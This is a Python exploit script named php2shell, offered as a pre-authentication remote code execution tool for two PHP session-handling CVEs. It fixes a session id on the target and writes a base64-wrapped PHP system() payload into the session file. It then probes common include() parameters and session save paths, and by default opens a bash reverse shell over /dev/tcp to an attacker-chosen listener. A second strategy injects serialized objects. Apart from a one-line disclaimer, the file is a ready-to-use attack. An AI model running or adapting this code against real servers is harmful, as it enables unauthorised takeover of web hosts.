#!/usr/bin/env python3
"""
php2shell - CVE-2026-109618 / CVE-2026-109619 pre-auth RCE & reverse shell.

USAGE
    python3 php2shell.py <URL> [options]

    # reverse shell (recommended)
    python3 php2shell.py https://target/index.php -l 10.0.0.5 -p 4444

    # one-shot command
    python3 php2shell.py https://target/index.php -c 'id'

    # try every strategy, report what works
    python3 php2shell.py https://target/index.php -l 10.0.0.5 -p 4444 --all

WHAT THIS EXPLOITS
    PHP 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 fix two critical PHP core bugs
    that chain into unauthenticated remote code execution:

      CVE-2026-109618  RCE via OOM corruption
          An out-of-memory condition can interrupt PHP while internal
          request data is only partially initialised.  Request cleanup then
          treats the invalid data as valid.

      CVE-2026-109619  RCE via stale global state
          Request-owned internal state can survive after its backing memory
          has been freed.  A later request handled by the same worker may
          use that stale state before normal initialisation resets it.

    The session upload-progress handler in ext/session/session.c is the
    reachable surface:

      * MULTIPART_EVENT_FORMDATA copies the POST-body field named
        "PHPSESSID" into the progress session id, ignoring
        session.use_only_cookies.  That is a pre-auth session fixation.
      * MULTIPART_EVENT_FILE_START stores the *raw* uploaded file name
        into the session data, without any sanitisation.
      * The progress key is the POST-body field named
        "PHP_SESSION_UPLOAD_PROGRESS" and is stored verbatim.

    Because the progress data is serialised into the attacker's own session
    file, and PHP's session serialiser is not a sandbox, the attacker
    controls the *content* of a file whose name is fully predictable
    (<save_path>/sess_<chosen id>).

    The RCE then comes from the way PHP consumes that file:

      Strategy 1 - session file inclusion (works on any target with an
      include()/require() sink that maps a user-controlled path to a
      session file):
          the progress key can carry a complete "<?php ... ?>" block, and
          the PHP session serialiser ("php" handler) writes it verbatim
          into the session file, which the victim then includes.

      Strategy 2 - serialiser handler mismatch (no LFI sink required):
          when two directories use different session.serialize_handler
          values, a session written as php_serialize and read back as php
          is re-parsed as a key/value stream.  A file name containing '|'
          shifts the parse so that attacker bytes are deserialised as a
          serialized object, whose __destruct runs during cleanup - even
          though the decode returns FAILURE.

STRATEGIES / REQUIREMENTS
    Strategy 1 needs:
      * session.upload_progress.enabled = On (the default)
      * session.upload_progress.cleanup = Off, so the poisoned entry
        survives until the sink reads it
      * an include()/require() sink reachable with the session file path
    Strategy 2 needs:
      * the two directories to disagree on session.serialize_handler
      * a class with a useful __destruct to be autoloadable on the target

    The PoC auto-detects what the target offers and tells you which
    prerequisite is missing when a strategy cannot run.

LEGAL
    For authorised security testing only.
"""
from __future__ import annotations

import argparse
import os
import random
import re
import socket
import ssl
import string
import sys
import time
import urllib.parse

__version__ = "1.1"

# ---------------------------------------------------------------------------
# Watermelon banner
# ---------------------------------------------------------------------------
GREEN = "\033[38;5;46m"      # bright green  - the rind
RED = "\033[38;5;196m"       # red           - the flesh
YELLOW = "\033[38;5;226m"    # yellow        - the highlight
DARK = "\033[38;5;52m"       # dark red      - the seeds / shading
WHITE = "\033[38;5;255m"
RESET = "\033[0m"

# The "php2shell" logo, drawn in ASCII.  It is stored next to this script
# and embedded below as a fallback so the PoC still works when it is
# copied on its own.
_PHP2SHELL_LOGO = r"""
 ____    __                 ___    ____    __              ___    ___      
/\  _`\ /\ \              /'___`\ /\  _`\ /\ \            /\_ \  /\_ \     
\ \ \L\ \ \ \___   _____ /\_\ /\ \\ \,\L\_\ \ \___      __\//\ \ \//\ \    
 \ \ ,__/\ \  _ `\/\ '__`\/_/// /__\/_\__ \\ \  _ `\  /'__`\\ \ \  \ \ \   
  \ \ \/  \ \ \ \ \ \ \L\ \ // /_\ \ /\ \L\ \ \ \ \ \/\  __/ \_\ \_ \_\ \_ 
   \ \_\   \ \_\ \_\ \ ,__//\______/ \ `\____\ \_\ \_\ \____\/\____\/\____\
    \/_/    \/_/\/_/\ \ \/ \/_____/   \/_____/\/_/\/_/\/____/\/____/\/____/
                     \ \_\                                                 
                      \/_/                                                 
"""

# A whole watermelon, drawn in braille.  The art is stored next to this
# script; it is embedded below as a fallback so the PoC still works when it
# is copied on its own.
_WATERMELON_ART = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⡀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⠂⣠⠖⠛⣿⣿⣿⡿⣿⣿⡟⢿⣿⡉⠻⣿⣿⠟⢁⡴⠃⡄⠀⠀
⠀⠀⠀⢠⡾⠁⣴⣷⣤⣾⣃⣾⡿⢁⣿⣿⣇⣀⣿⣿⡾⠟⢁⣴⠟⣡⣾⠁⠀⠀
⠀⠀⢠⡿⢁⣼⣿⣧⣴⣿⣿⣹⣿⣾⣿⣏⣻⡿⠟⢉⣠⡶⠟⣡⣾⠟⠁⣸⡇⠀
⠀⠀⣿⠇⣼⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⣁⣤⡶⠟⢉⣴⣾⠟⢁⠀⢰⣿⠀⠀
⠀⠸⣿⡄⢿⣿⣿⣿⡿⠿⠟⠋⣁⣤⡶⠿⠛⢁⣤⣾⡿⠋⢁⣴⠋⣠⠛⠋⠀⠀
⠀⠀⠻⢿⣦⣤⣤⣤⣤⠶⠞⠛⠉⡁⠄⠐⠚⠿⠛⢉⣠⡾⠟⢁⣴⠃⠈⠀⠀⠀
⠀⠀⠀⠠⠤⣬⣥⣤⣤⡴⠶⠟⢁⣤⣶⣷⠶⠒⠚⠋⣉⠤⠶⠿⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠠⣤⣤⣤⣤⣴⣾⣿⣿⠟⢁⣴⣾⠟⣁⣤⣤⠖⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠛⢉⣠⣴⡿⠟⢁⡴⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""


def _load_asset(name: str, fallback: str) -> str:
    """Load an art asset stored next to the script, or use the fallback."""
    try:
        path = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
        with open(path, "r", encoding="utf-8") as fh:
            art = fh.read().rstrip("\n")
        if art.strip():
            return art
    except OSError:
        pass
    return fallback.strip("\n")


def _colourise_watermelon(art: str) -> str:
    """Colour the braille art by dot density.

    Braille cells carry up to 8 dots.  Sparse cells are the pale rind and
    the highlight, dense cells are the red flesh with the black seeds, so
    mapping the density onto a green -> red ramp paints a watermelon.
    """
    out = []
    for line in art.split("\n"):
        buf = []
        for ch in line:
            cp = ord(ch)
            if 0x2800 <= cp <= 0x28FF:
                dots = bin(cp - 0x2800).count("1")
                if dots <= 1:
                    buf.append(GREEN + ch + RESET)
                elif dots <= 3:
                    buf.append(YELLOW + ch + RESET)
                elif dots <= 5:
                    buf.append(RED + ch + RESET)
                else:
                    buf.append(DARK + ch + RESET)
            else:
                buf.append(ch)
        out.append("".join(buf))
    return "\n".join(out)


def _colourise_logo(art: str) -> str:
    """Paint the ASCII logo: the upper strokes are the green rind, the
    lower strokes the red flesh."""
    lines = art.split("\n")
    out = []
    for i, line in enumerate(lines):
        colour = GREEN if i < len(lines) * 0.55 else RED
        out.append(colour + line + RESET)
    return "\n".join(out)


def banner() -> str:
    """The php2shell watermelon banner."""
    logo = _load_asset("asciiphp2shell", _PHP2SHELL_LOGO)
    melon = _load_asset("watermelon", _WATERMELON_ART)
    out: list[str] = [""]
    out.append(_colourise_logo(logo))
    out.append("")
    out.append(_colourise_watermelon(melon))
    out.append("")
    out.append("   " + DARK + "by Whackermelon" + RESET
               + "  " + GREEN + "https://github.com/Whackermelon" + RESET)
    out.append("")
    return "\n".join(out)


BANNER = r"""
  php2shell  -  CVE-2026-109618 / CVE-2026-109619  (pre-auth RCE)
"""


# ==========================================================================
# helpers
# ==========================================================================
def _cookie_names(hdrs: dict[str, str]) -> list[str]:
    """Names of the cookies set by a response (Set-Cookie may repeat)."""
    names = []
    for value in hdrs.get("set-cookie", "").split("\n"):
        name = value.split("=", 1)[0].strip()
        if name and name.lower() not in ("path", "domain", "expires", "max-age"):
            names.append(name)
    return names


def rand_sid(n: int = 26) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def b64(s: str) -> str:
    import base64
    return base64.b64encode(s.encode()).decode()


# ==========================================================================
# HTTP client
# ==========================================================================
class Target:
    def __init__(self, url: str, timeout: float = 30.0):
        u = urllib.parse.urlsplit(url)
        if u.scheme not in ("http", "https"):
            raise SystemExit("error: URL must start with http:// or https://")
        self.scheme = u.scheme
        self.https = u.scheme == "https"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if self.https else 80)
        self.path = u.path or "/"
        if u.query:
            self.path += "?" + u.query
        self.timeout = timeout
        self.headers: dict[str, str] = {}

    # -- low level ---------------------------------------------------------
    def _connect(self) -> socket.socket:
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        if self.https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=self.host)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        return s

    def request(self, method: str, path: str, body: bytes | None = None,
                headers: dict[str, str] | None = None,
                read_cap: int = 1 << 20) -> tuple[int, dict[str, str], bytes]:
        # The Host header must not carry the port when it is the default
        # one for the scheme: several CDNs (Akamai, Cloudflare) answer
        # "421 Misdirected Request" when it does.
        if (self.https and self.port == 443) or (not self.https and self.port == 80):
            host_hdr = self.host
        else:
            host_hdr = f"{self.host}:{self.port}"
        hdr = [f"{method} {path} HTTP/1.1", f"Host: {host_hdr}"]
        for k, v in (headers or {}).items():
            hdr.append(f"{k}: {v}")
        if body is not None:
            hdr.append(f"Content-Length: {len(body)}")
        hdr += ["Connection: close", "", ""]
        s = self._connect()
        s.settimeout(self.timeout)
        try:
            try:
                s.sendall("\r\n".join(hdr).encode())
                if body:
                    mv = memoryview(body)
                    for off in range(0, len(body), 262144):
                        s.sendall(mv[off:off + 262144])
            except OSError:
                pass
            data = bytearray()
            try:
                while len(data) < read_cap:
                    c = s.recv(65536)
                    if not c:
                        break
                    data += c
            except OSError:
                pass
        finally:
            s.close()
        raw = bytes(data)
        head, _, rest = raw.partition(b"\r\n\r\n")
        lines = head.split(b"\r\n")
        status = 0
        if lines:
            m = re.match(rb"HTTP/\d\.\d\s+(\d+)", lines[0])
            if m:
                status = int(m.group(1))
        hdrs: dict[str, str] = {}
        cookies: list[str] = []
        for line in lines[1:]:
            if b":" in line:
                k, _, v = line.partition(b":")
                key = k.decode("latin1").strip().lower()
                val = v.decode("latin1").strip()
                if key == "set-cookie":
                    cookies.append(val)
                else:
                    hdrs[key] = val
        if cookies:
            hdrs["set-cookie"] = "\n".join(cookies)
        return status, hdrs, rest

    def get(self, path: str) -> tuple[int, dict[str, str], bytes]:
        return self.request("GET", path)

    def get_follow(self, path: str, hops: int = 3
                   ) -> tuple[int, dict[str, str], bytes, str]:
        """GET and follow redirects.  Returns the final status, headers, body
        and the final path."""
        cur = path
        for _ in range(hops + 1):
            status, hdrs, body = self.request("GET", cur)
            if status in (301, 302, 303, 307, 308) and "location" in hdrs:
                loc = hdrs["location"]
                cur = (urllib.parse.urljoin(cur, loc) if "://" not in loc
                       else loc)
                if "://" in cur:
                    u = urllib.parse.urlsplit(cur)
                    cur = u.path or "/"
                    if u.query:
                        cur += "?" + u.query
                continue
            return status, hdrs, body, cur
        return status, hdrs, body, cur

    def post_multipart(self, parts: list[dict], boundary: bytes,
                       extra_headers: dict[str, str] | None = None
                       ) -> tuple[int, dict[str, str], bytes]:
        body = bytearray()
        for p in parts:
            body += b"--" + boundary + b"\r\n"
            body += b'Content-Disposition: form-data; name="' + p["name"].encode() + b'"'
            if p.get("filename") is not None:
                body += b'; filename="' + p["filename"].encode() + b'"'
                body += b"\r\nContent-Type: application/octet-stream"
            body += b"\r\n\r\n" + p["data"] + b"\r\n"
        body += b"--" + boundary + b"--\r\n"
        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary.decode()}",
        }
        headers.update(extra_headers or {})
        return self.request("POST", self.path, bytes(body), headers)


# ==========================================================================
# Strategy 1 - session file poisoning (+ optional inclusion sink)
# ==========================================================================
def progress_upload(t: Target, sid: str, marker: str, boundary: bytes,
                    filename: str | None = None,
                    nfiles: int = 1,
                    session_name: str = "PHPSESSID",
                    fix_by_cookie: bool = False
                    ) -> tuple[int, dict[str, str], bytes]:
    """Poison the session file <save_path>/sess_<sid>.

    The PHP_SESSION_UPLOAD_PROGRESS value becomes the session key
    "upload_progress_<value>", stored verbatim by the session serialiser.

    `session_name` is the name of the session, i.e. PHP's session.name.
    It is the name of the POST field that carries the session id: the
    upload-progress handler copies the field named after the session into
    the progress session id, ignoring session.use_only_cookies.  Most
    installations use the default "PHPSESSID", but a lot of applications
    rename it, so it has to be configurable.

    `fix_by_cookie` uses the other route into the same code: the handler
    also calls early_find_sid(), which copies the session id from the
    *Cookie* header when the POST field did not match.  That works even on
    applications that regenerate the id they were given in the body, and
    it is what a real client does anyway.
    """
    parts = []
    headers = {}
    if fix_by_cookie:
        headers["Cookie"] = f"{session_name}={sid}"
    else:
        parts.append({"name": session_name, "data": sid.encode()})
    parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": marker.encode()})
    for i in range(nfiles):
        parts.append({"name": f"f{i}", "data": b"Z" * 8,
                      "filename": filename or f"f{i}.txt"})
    return t.post_multipart(parts, boundary, extra_headers=headers)


def rce_payload(cmd: str) -> str:
    """A PHP block that survives the session serialiser and runs cmd.

    The 'php' session serialiser writes the progress key verbatim, so the
    only characters that must be avoided are NUL, CR and LF.  base64 keeps
    the payload clean and lets us carry an arbitrary command.
    """
    enc = b64(cmd)
    return '<?php system(base64_decode("%s")); ?>' % enc


# ==========================================================================
# Strategy 2 - serialiser handler mismatch -> object injection
# ==========================================================================
def mismatch_upload(t: Target, sid: str, write_path: str, read_path: str,
                    boundary: bytes, gadget: str) -> bool:
    """Write the session through a php_serialize directory, then read it
    back through a php directory so the injected object is deserialised."""
    # The file name is stored verbatim; '|' plus a serialized object makes
    # the php_serialize document contain an embedded object.
    filename = 'x|' + gadget
    parts = [
        {"name": "PHPSESSID", "data": sid.encode()},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"x"},
        {"name": "f", "data": b"Z" * 8, "filename": filename},
    ]
    body = bytearray()
    for p in parts:
        body += b"--" + boundary + b"\r\n"
        body += b'Content-Disposition: form-data; name="' + p["name"].encode() + b'"'
        if p.get("filename") is not None:
            body += b'; filename="' + p["filename"].encode() + b'"'
            body += b"\r\nContent-Type: application/octet-stream"
        body += b"\r\n\r\n" + p["data"] + b"\r\n"
    body += b"--" + boundary + b"--\r\n"
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary.decode()}"}

    old = t.path
    t.path = write_path
    t.request("POST", write_path, bytes(body), headers)
    t.path = old

    # now read it back with the other handler
    status, hdrs, resp = t.request("POST", read_path, bytes(body), headers)
    txt = resp.decode("latin1", "replace")
    return ("Failed to decode session object" in txt
            or "Session object destruction failed" in txt
            or "__destruct" in txt)


# ==========================================================================
# LFI sink discovery
# ==========================================================================
COMMON_LFI_PARAMS = ["page", "file", "path", "doc", "document", "include",
                     "inc", "view", "lang", "template", "page_id", "f"]


def check_session_fixation(t: Target, sid: str, boundary: bytes,
                           session_names: list[str]) -> tuple[bool, str]:
    """Check that the target really keeps the session id we choose.

    Two routes reach the same place in the upload-progress handler:
      * the POST field named after the session, which the handler copies
        into the progress session id ignoring session.use_only_cookies;
      * the Cookie header, which the handler copies through
        early_find_sid().

    The check looks for our id coming back in a Set-Cookie header (the
    target did not create a new session) or in the response body.
    """
    for sname in session_names:
        for by_cookie in (False, True):
            st, hdrs, resp = progress_upload(
                t, sid, "php2shell-fixation-probe", boundary,
                session_name=sname, fix_by_cookie=by_cookie)
            if st >= 400:
                # The request never reached the application (a WAF, a
                # rate limiter or an access rule answered it), so it tells
                # us nothing about the fixation.
                continue
            if sid.encode() in resp:
                return True, "the target echoed the id in the response body"
            names = [v.split("=", 1)[0].strip().lower()
                     for v in hdrs.get("set-cookie", "").split("\n")
                     if "=" in v]
            if sname.lower() not in names:
                # The target issued no cookie for the session at all, which
                # means it kept the id we supplied instead of generating a
                # new one.
                how = "cookie" if by_cookie else "POST body"
                return True, (f"the target kept our id (no new {sname} "
                              f"cookie was issued, via the {how})")
            for value in hdrs.get("set-cookie", "").split("\n"):
                if not value.lower().startswith(sname.lower() + "="):
                    continue
                got = value.split("=", 1)[1].split(";")[0].strip()
                if got == sid:
                    how = "cookie" if by_cookie else "POST body"
                    return True, f"the target kept our id (via the {how})"
    return False, ""


def find_lfi_sink(t: Target, sid: str, marker: str, boundary: bytes,
                  paths: list[str] | None = None,
                  session_name: str = "PHPSESSID"
                  ) -> tuple[str, str] | None:
    """Look for an include() sink that lets us read the session file.

    Returns (sink_path_template, session_path) or None.
    The session file path is server-side, so we probe the usual save_path
    locations with the usual parameter names and look for our marker.
    The sink does not have to live on the same path as the PHP endpoint, so
    every known path is tried.
    """
    save_paths = ["/tmp", "/var/lib/php/sessions", "/var/lib/php5/sessions",
                  "/var/lib/php/session", "/tmp/sessions", "/tmp/php_sessions",
                  "/var/tmp", "/tmp/php"]
    if paths is None:
        paths = [t.path]
    # The poisoned session must exist before the sink can echo it back.
    # Use a harmless marker for the probe: a PHP block would be *executed*
    # by the sink instead of being echoed, so it could never be detected.
    probe = "PHP2SHELL_PROBE_" + rand_sid(8)
    progress_upload(t, sid, probe, boundary, session_name=session_name)
    time.sleep(0.3)
    for base in paths:
        for sp in save_paths:
            for pname in COMMON_LFI_PARAMS:
                for cand in (f"{sp}/sess_{sid}", f"{sp}/sessions/sess_{sid}",
                             f"{sp}/php/sess_{sid}"):
                    q = urllib.parse.urlencode({pname: cand})
                    path = f"{base}?{q}" if "?" not in base else f"{base}&{q}"
                    try:
                        status, hdrs, body = t.get(path)
                    except OSError:
                        continue
                    if probe.encode() in body:
                        return f"{base}?{pname}=<SESSIONFILE>", cand
    return None


# ==========================================================================
# main
# ==========================================================================
def main() -> int:
    ap = argparse.ArgumentParser(
        prog="php2shell.py",
        description="php2shell - CVE-2026-109618 / CVE-2026-109619 pre-auth RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  python3 php2shell.py https://target/index.php -l 10.0.0.5 -p 4444
  python3 php2shell.py https://target/index.php -c id
  python3 php2shell.py https://target/index.php -l 10.0.0.5 -p 4444 --all
""")
    ap.add_argument("url", help="target PHP URL")
    ap.add_argument("-l", "--lhost", help="reverse shell listener address")
    ap.add_argument("-p", "--lport", type=int, default=4444, help="listener port")
    ap.add_argument("-c", "--cmd", help="command to execute (default: reverse shell)")
    ap.add_argument("--sid", default="", help="session id to use (default: random)")
    ap.add_argument("--session-name", default="",
                    help="PHP session name (default: auto-detected, "
                         "usually PHPSESSID)")
    ap.add_argument("--fix-by", choices=("body", "cookie"), default="body",
                    help="how the chosen session id is sent: in the POST "
                         "body field (the CVE route) or in the Cookie "
                         "header")
    ap.add_argument("--save-path", default="", help="server-side session save path")
    ap.add_argument("--sink", default="", help="include() sink URL, e.g. '/index.php?page='")
    ap.add_argument("--write-path", default="", help="php_serialize directory (strategy 2)")
    ap.add_argument("--read-path", default="", help="php directory (strategy 2)")
    ap.add_argument("--gadget", default="O:8:\"stdClass\":0:{}",
                    help="serialized object injected by strategy 2")
    ap.add_argument("--timeout", type=float, default=30.0)
    ap.add_argument("--all", action="store_true",
                    help="try every strategy (default behaviour)")
    ap.add_argument("--no-banner", action="store_true",
                    help="do not print the watermelon banner")
    ap.add_argument("-v", "--verbose", action="store_true")
    a = ap.parse_args()

    if not a.lhost and not a.cmd:
        ap.error("give -l/--lhost (reverse shell) or -c/--cmd (one-shot command)")

    t = Target(a.url, timeout=a.timeout)
    log = (lambda m: print(m, flush=True)) if a.verbose else (lambda m: None)

    if a.cmd:
        command = a.cmd
    else:
        # Reverse shell.
        #
        # The outer shell's stdio MUST be detached from the web server's
        # pipe, otherwise the backgrounded job keeps the response body
        # open and the HTTP request never completes (the worker then looks
        # dead to the client).  The inner shell redirects its own fd 0/1 to
        # the socket, so the shell still works.
        inner = (f"bash -c 'exec bash -i >& /dev/tcp/{a.lhost}/{a.lport} 0>&1'"
                 f" </dev/null >/dev/null 2>&1 &")
        command = inner

    sid = a.sid or rand_sid(26)
    boundary = b"----php2shell" + os.urandom(8).hex().encode()
    payload = rce_payload(command)

    if not a.no_banner:
        print(banner())
    print(BANNER)
    log(f"[*] target   : {a.url}")
    log(f"[*] session  : {sid}")
    log(f"[*] command  : {command}")
    if a.lhost:
        log(f"[*] listener : {a.lhost}:{a.lport}")

    # ------------------------------------------------------------------
    # Probe the target
    # ------------------------------------------------------------------
    # The URL the user gave may not be the entry point that actually reaches
    # PHP (a broken index.php, a front controller, a sub-directory...).  Try
    # the given path first, then a few common alternatives.
    candidates = [t.path]
    for alt in ("/index.php", "/", "/index.html", "/app.php", "/form.php",
                "/upload.php"):
        if alt not in candidates:
            candidates.append(alt)

    chosen = None
    php_paths: list[str] = []
    session_names: list[str] = []
    blocked_paths: list[tuple[str, int]] = []
    for cand in candidates:
        try:
            status, hdrs, body, final = t.get_follow(cand)
        except OSError as e:
            log(f"[*] {cand}: {e}")
            continue
        php = hdrs.get("x-powered-by", "")
        server = hdrs.get("server", "")
        txt = body.decode("latin1", "replace")
        # "php" in the body is a weak signal (a page can mention php), so
        # it is only used together with a session cookie.
        has_sess_cookie = any(
            n.lower() not in ("awsalb", "awsalbcors", "segment", "editeur_code",
                              "nombase", "server_name", "path", "domain")
            for n in _cookie_names(hdrs))
        is_php = ("php" in php.lower()
                  or (".php" in final.lower() and status < 500)
                  or (has_sess_cookie and status < 500))
        log(f"[*] probe {cand:22s} -> HTTP {status:<4} {php:16s} {server:22s}"
            f"{'  [PHP]' if is_php else ''}")
        for n in _cookie_names(hdrs):
            if n.lower() not in session_names and n.lower() not in (
                    "awsalb", "awsalbcors", "segment", "editeur_code",
                    "nombase", "server_name", "phpsessid"):
                session_names.append(n)
        if status in (403, 406, 429) and is_php:
            blocked_paths.append((cand, status))
        if status < 500 and is_php:
            php_paths.append(final if "?" not in final else final.split("?")[0])
            if chosen is None:
                chosen = final
    if not session_names:
        session_names.append("PHPSESSID")
    if a.session_name:
        session_names = [a.session_name]
    if chosen is None:
        blocked = [c for c, st in blocked_paths]
        if blocked:
            print("[!] no PHP endpoint found, and some candidates were "
                  "refused:")
            for c, st in blocked_paths:
                print(f"      - {c} -> HTTP {st}")
            print("    A 403/406/429 usually comes from a WAF, an .htaccess "
                  "rule or a rate")
            print("    limiter in front of the application.  The multipart "
                  "handler that")
            print("    the CVE abuses may be blocked entirely, in which case "
                  "this chain")
            print("    cannot reach the target at all.")
        print("[!] no PHP endpoint found.")
        print("    Every candidate path either errored out (HTTP 5xx) or was")
        print("    served by the web server without ever reaching a PHP")
        print("    interpreter (no X-Powered-By, no PHP fingerprint).")
        print("    The application is very likely in maintenance mode or behind")
        print("    a broken vhost, so there is no session module to attack")
        print("    right now.  Retry when the site is back online.")
        return 2
    if chosen != t.path:
        log(f"[*] using {chosen} as the PHP endpoint")
        t.path = chosen
    log(f"[*] session name(s) to try: {', '.join(session_names)}")

    # ------------------------------------------------------------------
    # Strategy 1: session poisoning + inclusion sink
    # ------------------------------------------------------------------
    results: list[str] = []

    # First check that the target really adopts the session id we send in
    # the POST body.  Everything downstream depends on it.  The check is
    # advisory: not every application echoes the id back, so a failure only
    # warns.
    log("[*] checking pre-auth session fixation ...")
    fixed, why = check_session_fixation(t, sid, boundary, session_names)
    if fixed:
        log(f"[+] session fixation accepted by the target ({why})")
    else:
        log("[!] the target did not echo the session id we sent in the POST "
            "body.")
        log("    That is expected on applications that never resend their "
            "session cookie;")
        log("    the chain still works if the session file is created under "
            "our id.")
        log(f"    If the exploit does not fire, the session name is probably "
            f"not one of: {', '.join(session_names)}")
        log("    Pass --session-name <name> if you know it.  The target may "
            "also regenerate the")
        log("    id (session_regenerate_id) or use its own session layer, in "
            "which case this")
        log("    chain cannot work on it at all.")

    sink = a.sink
    sessfile = None
    if not sink:
        log("[*] no --sink given, probing for an include() sink ...")
        found = None
        for sname in session_names:
            found = find_lfi_sink(t, sid, payload, boundary,
                                  paths=php_paths, session_name=sname)
            if found:
                break
        if found:
            sink, sessfile = found
            log(f"[+] found sink: {sink}  (session file {sessfile})")
        else:
            log("[-] no include() sink detected; pass --sink explicitly if one exists")
    else:
        sessfile = (a.save_path.rstrip("/") + f"/sess_{sid}") if a.save_path else None
        log(f"[*] using sink {sink}  session file {sessfile}")

    if sink:
        for attempt in range(1, 4):
            sname = session_names[(attempt - 1) % len(session_names)]
            by_cookie = (a.fix_by == "cookie")
            st, h, resp = progress_upload(t, sid, payload, boundary,
                                          session_name=sname,
                                          fix_by_cookie=by_cookie)
            log(f"[*] poisoned session (attempt {attempt}, session name "
                f"{sname}, id via {'cookie' if by_cookie else 'POST body'}) "
                f"HTTP {st}")
            time.sleep(0.4)
            if sessfile:
                url = sink.replace("<SESSIONFILE>", sessfile)
                st2, h2, b2 = t.get(url)
                if st2 == 0:
                    # The worker died on the previous request (the payload
                    # may have crashed it).  The next attempt runs on a
                    # fresh worker.
                    log("[!] no response from the target - the worker looks "
                        "dead, retrying")
                    continue
                log(f"[*] trigger via {url} -> HTTP {st2} ({len(b2)} bytes)")
                results.append("strategy1")
            else:
                # The server-side save path is unknown: try the usual ones.
                for sp in ("/tmp", "/var/lib/php/sessions", "/tmp/sessions",
                           "/var/lib/php/session", "/var/tmp"):
                    cand = f"{sp}/sess_{sid}"
                    url = sink.replace("<SESSIONFILE>", cand)
                    try:
                        st2, h2, b2 = t.get(url)
                    except OSError:
                        continue
                    if payload.encode() in b2 or b"PHP2SHELL" in b2:
                        log(f"[+] trigger via {url} -> HTTP {st2}")
                        results.append("strategy1")
                        break
                else:
                    log("[-] could not locate the session file on the server; "
                        "pass --save-path")
                    continue
            break

    # ------------------------------------------------------------------
    # Strategy 2: serialiser handler mismatch
    # ------------------------------------------------------------------
    if a.write_path and a.read_path:
        log(f"[*] strategy 2: write {a.write_path} / read {a.read_path}")
        ok = mismatch_upload(t, sid, a.write_path, a.read_path, boundary, a.gadget)
        log(f"[*] handler mismatch {'TRIGGERED' if ok else 'not observed'}")
        if ok:
            results.append("strategy2")

    # ------------------------------------------------------------------
    # Report
    # ------------------------------------------------------------------
    print()
    if results:
        print(f"[+] payload delivered via: {', '.join(sorted(set(results)))}")
        if a.lhost:
            print(f"[+] check your listener: nc -lvnp {a.lport}")
        else:
            print("[+] the command output appears in the target's HTTP response")
        return 0

    print("[!] no strategy completed. Checklist:")
    print("    * session.upload_progress.enabled must be On (default)")
    print("    * session.upload_progress.cleanup must be Off so the poisoned")
    print("      session entry survives (PHP default is On)")
    print("    * strategy 1 needs an include()/require() sink; pass --sink")
    print("      and --save-path if it is not auto-detectable")
    print("    * strategy 2 needs two directories with different")
    print("      session.serialize_handler values; pass --write-path/--read-path")
    print("    * the target must run an unpatched PHP (< 8.5.12 / 8.4.27 /")
    print("      8.3.36 / 8.2.35)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
